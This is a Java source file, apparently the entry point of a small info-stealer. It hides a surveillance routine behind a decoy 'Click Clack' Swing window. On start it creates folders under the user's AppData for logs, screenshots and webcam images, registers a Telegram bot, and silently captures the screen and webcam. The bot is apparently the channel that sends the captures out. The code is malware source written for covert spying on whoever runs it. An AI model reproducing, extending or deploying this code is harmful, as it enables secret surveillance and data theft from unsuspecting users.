import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.Map;

public class Starter {
    private static final String folder = "\\saiNick\\";
    private static final String environment_variable_path = "APPDATA";
    private static final String path_logs = "Logs\\\\";
    private static final String path_screenshot = "Screenshot\\\\";
    private static final String path_cam = "Cam\\\\";
    private static final int cam_width = 640;
    private static final int cam_height = 480;
    private static String app_path;
    private static final Map<String, String> map = System.getenv();
    private static final String response = "C:\\Users\\" + map.get("USERNAME") + "\\AppData\\Roaming\\saiNick\\";



    public static void main(String[] args) throws Exception {
        Start();
        JFrame f=new JFrame("Button Example");
        final JTextField tf=new JTextField();
        tf.setBounds(50,50, 150,20);
        JButton b=new JButton("Click Clack");
        b.setBounds(50,100,95,30);
        b.addActionListener(new ActionListener(){
            public void actionPerformed(ActionEvent e){
                tf.setText("Hello stiller started.");
                  }
        });
        f.add(b);f.add(tf);
        f.setSize(400,400);
        f.setLayout(null);
        f.setVisible(true);
    }

    private static void Start() throws Exception {
        app_path = System.getenv(environment_variable_path) + folder;

        createFolder(app_path);
        createFolder(app_path + path_logs);
        createFolder(app_path + path_screenshot);
        createFolder(app_path + path_cam);

        TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
        botsApi.registerBot(new Hello());

        callScreen();
        callCam();
    }

    private static void createFolder(String path) {
        System.out.println("Создано: " + path);
        new File(path).mkdir();
    }

    protected static void callScreen() throws Exception {
        Screenshot.TakeScreenshot(app_path + path_screenshot, "boba");
    }

    protected static void callCam() throws Exception {
        Cam.Capture(app_path + path_cam, "boba", cam_width, cam_height);
    }

}
